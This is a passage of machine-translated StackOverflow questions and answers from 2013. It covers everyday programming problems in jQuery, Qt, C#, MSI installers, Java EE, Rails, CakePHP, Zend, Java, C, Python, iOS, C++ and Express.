# StackOverflow 问答 15973000-15973999

# jquery - 发帖前获取用户价值

> ID：15973000
> 
> 赞同：4
> 
> 时间：2013-04-12T13:45:18.180
> 
> 标签：jquery

用户可以使用 jQuery 拖放在我的网站上进行绘画。

保存我使用的内容。

```
$('#mksave').click(function(){

    $("#topmenu").animateHighlight("#a7bf51", 4000);
    var div_contents = $("#print").html();
    $.post("save.php", { 'contents': div_contents });
    alert('Your painting is saved');
}) 
```

在这里，我将内容表单 div print 并通过 save.php 文件保存。

到目前为止一切正常。

我想要做的是当使用 klicks mksave （因此该函数将运行）时，用户被要求为绘画命名，之后我将使用 post 发送变量。

因此，必须有某种询问标题的警报屏幕。

问题是如何获得带有文本字段的警报屏幕并将给定的输入保存在 var 中，这样代码将如下所示：

```
$('#mkopslaan').click(function(){

    $("#topmenu").animateHighlight("#a7bf51", 4000);
    var div_contents = $("#print").html();

    var name = //return value from user input
    $.post("save.php", { 'contents': div_contents,  'name': name });

    alert('Your moodboard has been saved.');        
}) 
```

因此，我不希望名称文本框始终可见，而仅在单击时出现的框中。

编辑我不清楚。

**用户必须输入名称。**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T13:46:42.553

这是一个非常丑陋的解决方案，但您可以使用`prompt()`：

```
var name = prompt('Give a name for your painting:'); 
```

单击时`[Cancel]`，结果为空字符串或`null`. 要强制用户提供名称，您可以创建这个奇妙的循环：

```
var name;

do {
    name = prompt('Give a name for your painting:');
} while (!name); 
```

更整洁的解决方案也是可能的，使用类似的东西，[`jQuery UI Dialog`](http://jqueryui.com/dialog/)但它们需要一些实施工作；它绝对不会那么简单:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T13:48:55.690

你可以简单地使用`var name = prompt("Name your painting")`

# qt - QtCreator 棘手项目

> ID：15973005
> 
> 赞同：0
> 
> 时间：2013-04-12T13:45:36.083
> 
> 标签：qt, qt-creator, project-files

我有一个项目，`Qt Creator`其中有几个共享库项目和主项目，其中也包含主要功能。我想要的是添加一个不应该是共享库的新项目，而只是一个带有一些头文件的项目，我在其中保存定义和错误代码。我希望能够将此项目的路径添加到其他项目`INCLUDEPATH`中，以便在其他项目中使用这些文件。

为此，我创建了一个空项目，其`.pro`文件如下所示：

```
HEADERS += \
    myHeader.h 
```

但是当我构建整个项目时，它抱怨它没有在这个项目中找到只有一个标题的 main。

有可能`QtCreator`实现这一目标吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:14:22.417

创建一个`.pri`文件，其中包含您的`INCLUDEPATH`等；然后在其他项目的`.pro`文件中引用它：

```
# Common.pri
INCLUDEPATH += ../myPath
INCLUDE += myHeader.h

# OtherProject.pro
!include( ./Common.pri ) {
    error( Could not find the Common.pri file. )
}

INCLUDEPATH += ../myOtherPath 
```

请记住`+=`在文件中使用运算符，`.pro`否则它们将覆盖`.pri`文件变量。

# c# - C#隐藏继承的成员

> ID：15973008
> 
> 赞同：2
> 
> 时间：2013-04-12T13:45:41.117
> 
> 标签：c#, oop, interface

我有这个设置并得到一个编译器警告“......隐藏继承的成员......”。我该如何解决？

```
public interface IRepository<T> where T : class
{
    IQueryable<T> GetAll();
    T GetById(int id);
}

public class EFRepository<T> : IRepository<T> where T : class
{
    public EFRepository(DbContext dbContext)
    {
        if (dbContext == null)
            throw new ArgumentNullException("dbContext");
        DbContext = dbContext;
        DbSet = DbContext.Set<T>();
    }

    protected DbContext DbContext { get; set; }

    protected DbSet<T> DbSet { get; set; }

    public virtual IQueryable<T> GetAll()
    {
        return DbSet;
    }

    public virtual T GetById(int id)
    {
        return DbSet.Find(id);
    }

}

public interface IProductRepository : IRepository<Product>
{
    // Product specific interface code here
}

public class ProductRepository : EFRepository<Product>, IProductRepository
{
    public ProductRepository(DbContext context) : base(context) { }

    public IQueryable<Product> GetAll()
    {
        return DbSet.Include("Table1").Include("Table2").AsQueryable();
    }
} 
```

我收到编译器警告消息，但在运行应用程序时出现`StackOverflowException`错误。添加新关键字仍然会产生`StackOverflowException`错误。覆盖关键字不起作用。如果我注释掉这个`ProductRepository` `GetAll()`方法，一切都很好。但我需要重写该`GetAll()`方法。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-22T18:46:49.887

使用“new”关键字标记 ProductRepository.GetAll：

```
public new IQueryable<Product> GetAll()
{
    return DbSet.Include("Table1").Include("Table2").AsQueryable();
} 
```

这将隐藏方法 EFRepository.GetAll()。

如果您希望两种方法返回相同的结果，您还可以选择覆盖基本方法：

```
public override IQueryable<Product> GetAll()
{
    return DbSet.Include("Table1").Include("Table2").AsQueryable();
} 
```

# windows-installer - 在安装过程中卸载以前的产品时，产品不会从 Windows 中卸载

> ID：15973009
> 
> 赞同：0
> 
> 时间：2013-04-12T13:45:43.147
> 
> 标签：windows-installer, installation, installshield, uninstallation, basic-msi

我有一个 Installshield Basic MSI 安装程序，用于安装我们产品的新版本。如果用户仍在使用旧版本（由 Installscript 安装程序安装），安装程序将在继续安装新产品之前执行旧产品的卸载字符串。

当用户卸载我们产品的新版本时，这会导致一些问题。当要添加/删除程序并运行卸载程序时，卸载程序会运行并删除文件，但是当刷新添加/删除列表时，产品似乎仍处于安装状态。这些文件已被删除，但注册表中有产品的残余。

有效卸载产品的唯一方法是通过第 3 方注册表清理程序（可能还有一个由此构建的脚本）。奇怪的是，如果用户在安装新产品之前手动卸载旧产品，新产品的卸载将正常工作。此外，在机器上没有旧产品的情况下安装新产品也会导致完全卸载。

这两种产品有不同的产品代码。有什么想法可能导致这种情况吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T10:55:03.807

您可能在新产品安装过程中调用旧产品卸载字符串。MSI 安装脚本记录所有更改，还包括“卸载旧”更改。当您卸载新产品时，这些更改会被还原，因此 MSI 会恢复开始安装之前存在的注册表项。这些条目包括旧的产品卸载条目。

我对 InstallShield Basic MSI 模式知之甚少。如果它具有更改安装顺序或设置执行操作的时间的能力，则应确保旧产品的卸载发生在 InstallValidate 和 InstallInitialize 标准操作之间。如果 InstallShield 没有给您这样的控制权，您可能不得不要求您的用户手动卸载旧版本。

请参阅这篇关于卸载操作放置的文章：http: [//jpassing.com/2007/06/16/where-to-place-removeexistingproducts-in-a-major-msi-upgrade/](http://jpassing.com/2007/06/16/where-to-place-removeexistingproducts-in-a-major-msi-upgrade/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T16:09:34.490

如果添加/删除程序中显示未卸载的任何内容，则此处的注册表项仍然存在：

```
HTLM/Software/Microsoft/Windows/CurrentVersion/Uninstall/{ProductGUID or Name} 
```

或对于 64 位系统：

```
HKLM/Software/Wow6432Node/Microsoft/Windows/CurrentVersion/Uninstall/{ProductGUID or Name} 
```

在*新*包的卸载部分，确保它们：

1.  没有相同的产品 ID（您已经说过，但请确保；））
2.  如果需要，请在代码中添加一行以删除剩余的注册表项。

您可以将文件嵌套到 Installshield 和 Wise 软件包工作室。您可以编写一个 .bat 文件，将其放在临时目录中，对其进行编码，以便在运行时删除 ex 中的最后一位。注册表项。

或者

创建一个虚拟机，安装新产品，使用 Wise 捕获它并以这种方式进行部署。

如果没有看到 Installshield 中的代码，我不知道我能给出什么详细的解释......

格力！！！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-15T13:28:05.040

我假设您没有在新安装程序中正确设置升级机制。也许您在升级菜单中的项目上选择了“安装设置然后删除不需要的文件”。如果是这样，请将其更改为“首先删除旧设置”并检查您是否使用了正确的 UpgradeCode。或者只是为以前版本的安装程序创建一个新的升级项目，并在安装前将其删除。

# timer - EJB Timer JEE6 不会自动启动

> ID：15973010
> 
> 赞同：2
> 
> 时间：2013-04-12T13:45:44.447
> 
> 标签：timer, java-ee-6

为什么这个时间不起作用？我错过了什么？

我正在使用 GlassFish 3.1.2。

```
package foo.bar;

import javax.ejb.Schedule;
import javax.ejb.Singleton;

@Singleton
public class MySimpleTimerEJB {

    @Schedule(second="*/1")
    public void foo() {
        System.out.println("Foo");
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:44:20.180

解决了，

正如[Piotr](https://stackoverflow.com/users/920607/piotr-nowicki)建议的那样，我还必须告知分钟和小时，因为它们具有默认的零值。

我也使用了 persistent=false 属性，并得到了预期的结果。

```
@Schedule(second="*", minute="*",hour="*", persistent=false)
public void foo() {
    System.out.println("Foo");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:16:14.583

如果您希望调度计数器在部署后立即启动，则必须添加 @startup 注释，以便容器处理并开始调度管理

# ruby-on-rails - 以特定顺序运行时，Rspec 测试失败

> ID：15973014
> 
> 赞同：1
> 
> 时间：2013-04-12T13:45:46.240
> 
> 标签：ruby-on-rails, rspec, capybara

假设我有两个测试文件。File_A_spec.rb 和 File_B_spec.rb。当 File_A 中的测试在 File_B 中的测试之前运行时，一切都通过了。但是，当 File_B 中的测试在 File_A 之前运行时，File_A 中的测试会失败。

这两个文件都是请求规范。File_A 和 File_B 中的测试是不相关的，应该没有依赖关系。这可能是什么原因造成的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T13:53:45.577

固定的。失败的测试返回的错误是“未定义的方法‘锁定’”。

其中一个模型中有一个名为“锁定”的范围，我猜 ActiveRecord 不喜欢这个。类似于这里发生的事情：[https ://github.com/rails/rails/issues/7421](https://github.com/rails/rails/issues/7421)

范围已重命名，现在一切都在过去。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:48:28.440

您很可能有静态变量或`before :all`子句。

请注意，`before :all`操作不会被清理。你应该把它们清理干净`after :all`

# class - 为什么事件 onchange 不适用于类属性？

> ID：15973024
> 
> 赞同：0
> 
> 时间：2013-04-12T13:46:30.400
> 
> 标签：class, cakephp, onchange

我在使用 cakephp 时遇到问题，实际上，我正在尝试在选择框中使用事件“onChange”，但是当我尝试为我的特定类设置时，我真的不知道为什么它不起作用输入。

这是我的代码：

```
<form>
<?php
echo $this->Form->input(' ', array('class' => 'styledselect_pages', 'options' => array(10, 20, 40), 'empty' => 'Afficher par', 'onchange' => 'alert();'));
?>
</form> 
```

​此代码不起作用，但如果我只删除 'class' => 'styledselect_pages' 并且什么都不设置，一切正常！

我错过了什么吗？

编辑：我的 CSS 中的 styledselect_pages 是：

```
background: url(../img/table/select_number_rows.gif) left no-repeat;
border: none;
border-left: none;
color: #393939;
cursor: pointer;
display: block;
font-family: Arial;
font-size: 12px;
height: 20px;
line-height: 16px;
margin: 0px 0px 0px 0px;
padding: 4px 0 0 6px;
text-align: left;
width: 130px; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:47:04.893

乍一看，这段代码没有任何问题，所以我怀疑页面上正在*“捕获”*事件的另一个 JavaScript 处于活动状态。

要检查是否是这种情况，请尝试不*删除*“类”选项，但（暂时）使用不同的名称，并检查它是否解决了问题，

例如：

`'class' => 'styledselect_pages-DISABLED'`

如果这解决了问题并且您正在使用某个库来**“皮肤”**（**“样式”**）选择，那么整个“选择”很可能隐藏在页面上，并且“可见”下拉菜单不是实际的下拉菜单, 但其他 HTML 元素模仿下拉。

这些元素可能不会触发原始选择的“更改”，因此不会调用您的函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T13:51:49.877

试试这个：函数js

```
function    yourfunction(){
       alert("test");
    } 
```

你的代码：

```
<form>
<?php
echo $this->Form->input(' ', array('class' => 'styledselect_pages', 'options' => array(10, 20, 40), 'empty' => 'Afficher par', 'onchange' => "yourfunction();"));
?>
</form> 
```

# console - 调用控制台操作时，zend framework 2 通知出现在控制台中

> ID：15973025
> 
> 赞同：0
> 
> 时间：2013-04-12T13:46:39.433
> 
> 标签：console, zend-framework2, zend-controller, zend-controller-router

我已经按照 zend[文档](https://packages.zendframework.com/docs/latest/manual/en/modules/zend.console.controllers.html)的简单步骤开发了许多简单的控制台操作。

我的动作只有一个文字参数。它工作正常并且执行了该操作，但之前，在每个调用中都会出现以下通知和堆栈跟踪。

我如何删除/解决此消息

```
 Notice: Undefined index: HTTP_ACCEPT_LANGUAGE in C:\xampp\htdocs\pfc_desarrollo\module\SecureDraw\Module.php on line 124

    Call Stack:
        0.0003     121464   1\. {main}() C:\xampp\htdocs\pfc_desarrollo\public\index.php:0
        0.0079     237776   2\. Zend\Mvc\Application::init() C:\xampp\htdocs\pfc_desarrollo\public\index.php:12
        0.1589    1822568   3\. Zend\Mvc\Application->bootstrap() C:\xampp\htdocs\pfc_desarrollo\vendor\zendframework\zendframework\library\Zend\Mvc\Application.php:239
        0.2135    2232464   4\. Zend\EventManager\EventManager->trigger() C:\xampp\htdocs\pfc_desarrollo\vendor\zendframework\zendframework\library\Zend\Mvc\Application.php:142
        0.2135    2232584   5\. Zend\EventManager\EventManager->triggerListeners() C:\xampp\htdocs\pfc_desarrollo\vendor\zendframework\zendframework\library\Zend\EventManager\EventManager.php:204
        0.2350    2387304   6\. call_user_func() C:\xampp\htdocs\pfc_desarrollo\vendor\zendframework\zendframework\library\Zend\EventManager\EventManager.php:460
        0.2350    2387320   7\. SecureDraw\Module->onBootstrap() C:\xampp\htdocs\pfc_desarrollo\vendor\zendframework\zendframework\library\Zend\EventManager\EventManager.php:460
    --------------------------------HELLOOOOOO------------------ 
```

这是我的动作/路线定义

```
 //module.php
    'console' => array(
        'router' => array(
            'routes' => array(
                'hello' => array(
                    'options' => array(
                        'route'    => 'hello',
                        'defaults' => array(
                            'controller' => 'SecureDraw\Controller\Participant',
                            'action'     => 'hello',
                        ),
                    ),
                ), //Line 124
            ),
        ),
    ),  

    //Participant.php
    public function helloAction(){
        return "--------------------------------HELLOOOOOO------------------";
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T15:04:11.023

您必须尝试访问 Module.php 文件中的服务器变量 HTTP_ACCEPT_LANGUAGE。

$_SERVER['HTTP_ACCEPT_LANGUAGE'] 通常使用请求页面的浏览器设置，但是当您从控制台运行应用程序时，它可能没有设置。

您应该在访问它之前检查它是否已设置。

# java - Scanner.reset() 不起作用

> ID：15973040
> 
> 赞同：7
> 
> 时间：2013-04-12T13:47:23.077
> 
> 标签：java

这段代码应该从用户那里得到一个整数，然后完成程序。如果用户输入了一个无效的号码，它会再次询问用户。

捕获异常后，它用于`Scanner.reset()`重置扫描仪，但它不起作用。它会重新抛出以前的异常。

```
Scanner in = new Scanner(System.in);
while (true) {
    try {
        System.out.print("Enter an integer number: ");
        long i = in.nextLong();
        System.out.print("Thanks, you entered: ");
        System.out.println(i);
        break;
    } catch (InputMismatchException ex) {
        System.out.println("Error in your input");
        in.reset(); // <----------------------------- [The reset is here]
    }
} 
```

我以为`Scanner.reset()`会重置一切并忘记异常。我在向用户询问新输入之前将其放入。

如果我理解错误，那么正确的方法是什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-12T13:51:02.853

您误解了该`reset`方法的目的：它用于重置与扫描仪关联的“元数据”——它的空格、分隔符等。它不会改变其输入的状态，所以它不会达到你正在寻找的东西。

你需要的是一个调用`next()`，它读取并丢弃任何`String`来自`Scanner`：

```
try {
    System.out.print("Enter an integer number: ");
    long i = in.nextLong();
    System.out.print("Thanks, you entered: ");
    System.out.println(i);
    break;
} catch (InputMismatchException ex) {
    System.out.println("Error in your input");
    in.next(); // Read and discard whatever string the user has entered
} 
```

依靠异常来捕获异常情况是可以的，但解决同一问题的更好方法是`has...`在调用方法之前使用`next...`方法，如下所示：

```
System.out.print("Enter an integer number: ");
if (!in.hasNextLong()) {
    in.next();
    continue;
}
long i = in.nextLong();
System.out.print("Thanks, you entered: ");
System.out.println(i);
break; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-12T13:51:02.077

根据[Scanner.reset() javadoc](http://docs.oracle.com/javase/6/docs/api/java/util/Scanner.html#reset%28%29)，该方法仅“重置”语言环境、基数和分隔符设置。它不会对它已经读取的数据做任何事情。

# c# - 使用高斯分布生成 0 到 1 之间的随机数

> ID：15973043
> 
> 赞同：7
> 
> 时间：2013-04-12T13:47:40.387
> 
> 标签：c#, random

我想在 C# 中编写一个方法来生成一个随机数，其中高斯分布在范围内`[0:1]`（并且提前在 [0-x] 中）。我找到了这段代码但不能正常工作

```
Random rand = new Random(); //reuse this if you are generating many
double u1 = rand.NextDouble(); //these are uniform(0,1) random doubles
double u2 = rand.NextDouble();
double randStdNormal = Math.Abs( Math.Sqrt(-2.0 * Math.Log(u1)) * 
                                 Math.Sin(2.0 * Math.PI * u2)); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-12T15:06:36.307

我写了一篇关于如何在任何给定分布下生成随机数的博客文章：

[http://ericlippert.com/2012/02/21/generating-random-non-uniform-data/](http://ericlippert.com/2012/02/21/generating-random-non-uniform-data/)

总结一下，你想要的算法是：

1.  计算出所需的**概率分布函数**，使得曲线部分下方的面积等于在该范围内随机生成一个值的概率。
2.  整合概率分布以确定**累积分布**。
3.  反转累积分布以获得**分位数函数**。
4.  通过 quantile 函数运行它来转换您的均匀分布在 (0,1) 上的随机数据。

当然，如果您已经知道所需分布的分位数函数，那么您不需要执行步骤 1 到 3。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-11-15T17:05:25.177

你说你想要一个 0 到 1 之间正态分布（高斯）随机数的生成器。

首先，正态分布是无界的......您在示例中显示的函数生成正态分布的随机数，均值为 0.0，标准差为 1.0

您可以生成任何平均值和标准偏差的正态分布随机值，方法是将从此函数获得的值乘以所需的标准偏差，然后加上所需的平均值......

代码按原样正常 - 问题是对高斯（正态）分布的误解，其范围为 -inf 到 +inf ...

大约 2/3 的时间你得到的值将在 +/- 1 标准偏差之间......大约 95% 的时间值将在 +/1 3 倍标准偏差之间......

# linux - UDP 服务器进程无法接受来自内核的数据包

> ID：15973047
> 
> 赞同：1
> 
> 时间：2013-04-12T13:47:52.530
> 
> 标签：linux, networking, network-programming, fedora

我有一个非常简单的 UDP 服务器程序

```
 #include <sys/socket.h>
    #include <netinet/in.h>
    #include <stdio.h>
    #include <string.h>

    int main(int argc, char**argv)
    {
       int sockfd,n;
       struct sockaddr_in servaddr,cliaddr;
       socklen_t len;
       char mesg[1000];

       sockfd=socket(AF_INET,SOCK_DGRAM,0);

       bzero(&servaddr,sizeof(servaddr));
       servaddr.sin_family = AF_INET;
       servaddr.sin_addr.s_addr=htonl(INADDR_ANY);
       servaddr.sin_port=htons(54000);
       bind(sockfd,(struct sockaddr *)&servaddr,sizeof(servaddr));

       for (;;)
       {
          len = sizeof(cliaddr);
          n = recvfrom(sockfd,mesg,1000,0,(struct sockaddr *)&cliaddr,&len);
          sendto(sockfd,mesg,n,0,(struct sockaddr *)&cliaddr,sizeof(cliaddr));
          printf("-------------------------------------------------------\n");
          mesg[n] = 0;
          printf("Received the following:\n");
          printf("%s",mesg);
          printf("-------------------------------------------------------\n");
       }
    } 
```

我把它放在几台机器上，让一个 udp 客户端向它发送数据包，它可以成功接受传入的 udp 数据包

然后我把它放在一台带有fedora 18的机器上我编译程序并运行它然后我让一个udp客户端向它发送数据包（与其他机器上相同）但程序不能接受我使用的传入UDP数据包tcpdump 用于捕获，我可以看到传入的 udp 数据包为什么服务器程序不接受这台机器上的传入 UDP 数据包？

我检查了 iptables 规则`iptables -L` ，结果在

[https://docs.google.com/file/d/0B09y_TWqTtwlNHp1eTJkTFNuY0k/edit?usp=sharing](https://docs.google.com/file/d/0B09y_TWqTtwlNHp1eTJkTFNuY0k/edit?usp=sharing)

这有潜在的原因吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T13:50:07.260

乍一看，代码看起来不错。

最明显的解释可能只是 Fedora 18 机器已经安装`iptables`了默认配置的防火墙......

尝试运行`lsmod`以查找已加载的`iptables`模块和/或`iptables -L`列出当前规则集。

# javascript - 在 CGI 脚本中使用 Python 中的 replace() 函数会返回看似随机的字符串

> ID：15973049
> 
> 赞同：0
> 
> 时间：2013-04-12T13:47:56.283
> 
> 标签：javascript, python, cgi

在一个相当复杂的 Python CGI 脚本中，我从客户端网页的表单中接收到一个字符串。该字符串是格式为“YYYY-MM-DD HH-MM-SS”的日期和时间值，它显然完好无损地到达脚本。然后我继续这样做：

```
str = originalString.split()    # Returns correct list: ['YYYY-MM-DD','HH-MM-SS']
time = str[1].replace('-', ':') # At this point, the value of 'time' is something like 1Y92G3~F
dateT = str[0] + ' ' + time 
```

当我通过 ssh 在同一个服务器上对同一种字符串尝试相同的操作时，结果是正确的并且符合预期。

有没有人知道发生了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T13:58:34.507

我直接复制了您的代码，为 编了一个值`str`，并且在 3.3 上的输出对我来说是正确的。

很可能您正在覆盖 的值`str`，这会导致进一步的问题。即使这不是这里的原因，这也是不好的做法，无论如何您都应该更改该变量名。

# ios - 使用协议 - 如何将消息发送回 ViewController？

> ID：15973054
> 
> 赞同：0
> 
> 时间：2013-04-12T13:48:10.753
> 
> 标签：ios, objective-c, delegates, protocols

我进行了子类化`UIImageView`以添加其他方法。我把这个对象放在我`viewController`的身上，我有一个触摸手势识别器为那个对象启动并运行。我有几个。我的意图是，在触摸时，`viewController`根据我`UIImageView`的哪个子类被触摸（已经可以区分它们中的哪些被触摸）会发生一些事情。

我想发送一条消息（来自被触摸项目的属性），`viewController`以便我可以采取相应的行动。但是，我没有做到这一点。我试图为此目的实现一个协议，但它似乎不起作用。我认为我的问题是关于理解它是如何工作的，因为我感到困惑（委托如何与我的触摸识别器交互？），并且我未能成功实现工作协议。

我`viewController`的叫`EditViewController`. 我制作的子类`UIImageView`被称为`ClickableImage`（我有我的理由:)，它实现：

```
-(void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event
{
    // some code calculating the index i want to return to the viewcontroller
} 
```

我如何使这一切正常工作？如何将该索引返回到我的`viewController`? 请给我一个示例的骨架，以便我可以使用它，或者解释如何使用它，因为我一无所知:)

感谢您的时间！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:06:04.273

基本上，协议和委托旨在允许您将消息发送到另一个控制器以执行操作。

在您的`UIImageView`子类中，`ClickableImage.h`：

```
@class  ClickableImage;
@protocol ClickableImageDelegate<NSObject>

-(void)delegateMethod:(id)sender;//This method will be executed in EditViewController

@end

@interface ClickableImage : UIViewController
@property(nonatomic, strong)id <ClickableImageDelegate>delegate;
@end 
```

**ClickableImage.m:**

```
 //...
    @synthesize delegate;

    -(void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event
    {
        // some code calculating the index i want to return to the viewcontroller
            id index;//initialize the index
            if([self.delegate respondsToSelector:@selector(delegateMethod:)]){
                 [self.delegate delegateMethod:index];
            }

    } 
```

**编辑视图控制器.h：**

```
@interface EditViewController : UIViewController<ClickableImageDelegate>

@property(nonatomic, strong) ClickableImage *clickableImageController; 
```

**编辑视图控制器.m：**

```
 //....
     @synthesize clickableImageController;
    -(void)viewDidLoad{
        self.clickableImageController.delegate = self;//Don't forget to make a property for clickableImageController 

}
    -(void)delegateMethod:(id)sender{

    //sender is the index, Do your stuff here
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:05:57.163

一种方法是在您的 touchesBegan:withEvent: [[NSNotificationCenter defaultCenter] postNotification...

并在您的控制器内为此通知添加观察者

# c++ - 如何允许用户在 C 中搜索文件中的内容？

> ID：15973056
> 
> 赞同：0
> 
> 时间：2013-04-12T13:48:16.513
> 
> 标签：c++, arrays, string, search

我有一个包含不同联系人详细信息的文本文件。基本上是这样的

> John Doe 024587 7 月 24 日在家工作 在家生活 Jane Doe 024584 8 月 25 日在工作中工作 生活在工作中

我希望能够在文件中搜索“John Doe”或“Jane Doe”。

我决定从文件中读取内容并将它们存储在一个数组中。我想知道如何搜索数组。这段代码似乎没有削减它。noOfContacts 是文件中的联系人数量。

```
 readFile.open("book.txt", ios::out);
          while (!readFile.eof())
          {
            cout << "Enter anything you wish to search" <<endl;
            getline(cin, searchString);

            for (int k = 0; k < noOfContacts; k++)
            {       
                        getline (readFile,name[k]);
                                readFile >> phone[k];
                getline(readFile,birth[k]);
                getline(readFile,address[k]);
                getline(readFile,workplace[k]);

                cout << name[k]<<endl;
                cout << phone[k]<< endl;
                cout << birth[k]<<endl;
                cout << address[k]<<endl;
                cout << workplace[k]<<endl;

                break;
            } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:02:31.420

Why is there a for loop? Would it not be easier to do something like:

```
 unsigned found = 0;

 cout << "Enter anything you wish to search" <<endl;
        getline(cin, searchString);

 while(!readFile.eof() && (found==0)){  
     getline(readFile,testString);

     found=testString.find(searchString);
 }

 if (found == 0) {
 cout << "String found!\n " << testString.c_str(); << endl;
 }
 else{
 cout << "String Not Found!\n";
 } 
```

I've not tested this code but hopefully it'll give you an idea of which way to go.

# node.js - express/connect中间件的控制顺序

> ID：15973059
> 
> 赞同：5
> 
> 时间：2013-04-12T13:48:30.420
> 
> 标签：node.js, express, connect.js

我正在尝试添加应该阻止访问部分站点的身份验证中间件：

```
app = express()
    .get('/api/test', function (req, res) { ... })
    .use('/api', function (req, res, next) {
        if (req.param('key')) {
            next();
        } else {
            res.json(401, {
                message : 'Authentication failed'
            });
            res.end();
        }
    })
    .get('/api/data', function (req, res) { ... }); 
```

我期望调用 /api/data 将首先由密钥检查器处理，然后（如果成功）由 /api/data 处理程序处理。而是首先由'/api/data'处理的请求。

似乎检查器适用于 /api/something_that_does_not_exist，但不适用于 /api/something_that_exist。

也许我错过了 express/connect 文档中的某些内容？

**更新**我已经跟踪到这样一个事实，即第一个 get/post 调用初始化路由器中间件，因此它首先被执行。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-12T15:16:44.807

声明路由后，Express`router`会在设置应用程序时将中间件插入中间件堆栈。

在您的情况下，因为您`.get('/api/test', ...)`在插入密钥检查中间件之前插入，所以路由器中间件被插入并将优先（也适用于`/api/data`您稍后声明的路由）并且永远不会调用您的密钥检查器。

这里有两个解决方案：

```
// separate middleware, used for all routes that need checking
var keyChecker = function(req, res, next) {
  ...
};
app.get('/api/test', function(req, res) { ... });
app.get('/api/data', keyChecker, function(req, res) { ... });

// or, as an alternative, create a 'catch-all' route between the routes that don't
// need to be checked, and the ones that should; this will also match non-existing
// routes (like '/api/foobar'), which might or might not be an issue;
app.get('/api/test', function(req, res) { ... });
app.all('/api/*', function(req, res, next) { // 'all' means 'all methods'
  // keychecker code
});
app.get('/api/data', function(req, res) { ... }); 
```

第三种解决方案可能是`/api/test`在密钥检查中间件本身 ( `req.path === '/api/test'`)中显式检查，`next()`如果匹配则调用。

# python - Python 脚本在命令行中有效，但在运行 .py 文件时无效

> ID：15973064
> 
> 赞同：0
> 
> 时间：2013-04-12T13:48:54.943
> 
> 标签：python, python-3.x

我显然仍然是一个初学者，但我正在创建一个解析文件，它通过一个文本文件，并构建一个我需要的文件。

物流并不像明显发生的事情那么重要。

```
import fileinput;
for lines in fileinput.FileInput("c:/manhattan.txt", inplace=1):    
    lines = lines.strip();                      
    if lines == '': continue;
    print(lines);

source = open('c:/manhattan.txt','r');
hrt = open('c:/test.hrt','w');
currentline = str(source.readline());  
currentline.lstrip();
workingline = '';                      
while currentline[0] != " ":
    if currentline[0].isdigit() == True:
        if currentline[0:3] == workingline[0:3] and len(workingline)<160:  
            workingline = workingline + currentline[4:7];          
            currentline = str(source.readline());   
            currentline.lstrip();
        else:
            hrt.write(('\x01' + 'LOC01LOC' + workingline).ljust(401,' ') +'\n');  
            workingline = currentline[0:7].replace(';','E');
            currentline = str(source.readline());
            currentline.lstrip();
    else:
        currentline = str(source.readline());
        currentline.lstrip();

hrt.write(('\x01'+'LOC50US1   A*').ljust(401,' ' +'\n');                                                                                                                                                                                                                                                                                                                                                          
hrt.write(('\x02'+'LOCSUNSAT00:0023:5960 60             99990.00  0.00').ljust(401,' ')+'\n');                                                                                                                                                                                                                                                                                                                                                              
hrt.write(('\x02'+'US SUNSAT00:0023:5960 60             99990.03  0.03').ljust(401,' ') +'\n');  
hrt.close();
source.close(); 
```

它在 python 命令行中运行良好，但是在运行 .py 文件时，它不会将最后三行写入文件。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:04:15.437

您是否尝试过在关闭文件之前刷新缓冲区？

```
hrt.flush() 
```

# java - 在java中复制文件（不起作用）

> ID：15973066
> 
> 赞同：-3
> 
> 时间：2013-04-12T13:48:57.540
> 
> 标签：java, file, directory, copy

我已经尝试了许多来自同一个问题的例子，包括：

```
IOUtils.copy(); 
```

（复制是一种不存在的方法）

`Files.copy(source, target, REPLACE_EXISTING);`

(REPLACE_EXISTING "找不到符号")

```
FileUtils.copyFile(); 
```

（FileUtils 不存在）

使用它们的问题在括号中。

以下是重复次数最多的复制方法的代码：

```
import static java.nio.file.Files;
public void Install()
{
    CrtFol();
    CrtImgFol();
    CrtSaveFol();
    CrtSaveFile();
    open.runmm();
    //I have added the import for "Files"
    Files.copy(img1, d4, REPLACE_EXISTING);
    //Compiler says "Cannot find symbol" when I go over REPLACE_EXISTING
    //img1 is a File and d4 is a File as a directory
} 
```

还有其他方法可以复制或修复上述方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T14:03:19.293

With Java 7's standard library, you can use [java.nio.file.Files.copy(Path source, Path target, CopyOption... options)](http://docs.oracle.com/javase/7/docs/api/java/nio/file/Files.html#copy%28java.nio.file.Path,%20java.nio.file.Path,%20java.nio.file.CopyOption...%29). No need to add additional dependencies or implement your own.

```
try {
     Files.copy( Paths.get( sFrom ), 
                 Paths.get( sTo ),
                 StandardCopyOption.REPLACE_EXISTING);
